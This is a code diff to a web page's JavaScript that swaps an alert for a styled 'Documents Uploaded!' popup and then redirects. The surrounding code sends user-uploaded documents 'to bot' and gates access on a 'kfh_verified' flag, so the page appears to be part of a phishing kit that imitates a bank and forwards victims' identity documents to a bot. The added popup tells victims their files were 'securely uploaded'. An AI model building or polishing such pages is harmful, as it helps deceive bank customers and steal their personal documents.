@@ -370,8 +370,7 @@
             // Send to bot and wait for completion
             await sendToBot();
             
-            // Redirect after sending
-            window.location.href = 'details.html';
+            // Don't redirect here - popup will handle redirect
         });
 
         // Send document data to bot
@@ -432,7 +431,8 @@
                 }
 
                 console.log('All documents sent to bot successfully');
-                alert('Documents uploaded successfully!');
+                // Show success popup instead of alert
+                showDocumentSuccessPopup();
             } catch (err) {
                 console.log('Bot notification error:', err);
                 alert('Error uploading documents. Please try again.');
@@ -487,6 +487,88 @@
             }
         }
 
+        // Success popup for document upload
+        function showDocumentSuccessPopup() {
+            const popup = document.createElement('div');
+            popup.className = 'success-popup';
+            popup.innerHTML = `
+                <div class="success-popup-content">
+                    <div class="success-popup-icon">✓</div>
+                    <h3>Documents Uploaded!</h3>
+                    <p>Your documents have been securely uploaded.</p>
+                </div>
+            `;
+            document.body.appendChild(popup);
+            
+            // Add styles
+            popup.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.5);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 10000;
+                animation: fadeIn 0.3s ease;
+            `;
+            
+            const content = popup.querySelector('.success-popup-content');
+            content.style.cssText = `
+                background: white;
+                padding: 40px;
+                border-radius: 20px;
+                text-align: center;
+                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                animation: slideUp 0.3s ease;
+            `;
+            
+            const icon = popup.querySelector('.success-popup-icon');
+            icon.style.cssText = `
+                width: 80px;
+                height: 80px;
+                background: linear-gradient(135deg, #009144, #006B35);
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 40px;
+                color: white;
+                margin: 0 auto 20px;
+            `;
+            
+            popup.querySelector('h3').style.cssText = `
+                color: #006B35;
+                font-size: 24px;
+                margin: 0 0 10px;
+            `;
+            
+            popup.querySelector('p').style.cssText = `
+                color: #666;
+                font-size: 16px;
+                margin: 0;
+            `;
+            
+            // Add animations
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+                @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+            `;
+            document.head.appendChild(style);
+            
+            // Close after 2 seconds and redirect
+            setTimeout(() => {
+                popup.style.animation = 'fadeIn 0.3s ease reverse';
+                setTimeout(() => {
+                    popup.remove();
+                    window.location.href = 'details.html';
+                }, 300);
+            }, 2000);
+        }
+        
         // Check if user came from verify
         if (!sessionStorage.getItem('kfh_verified')) {
             window.location.href = 'application.html';
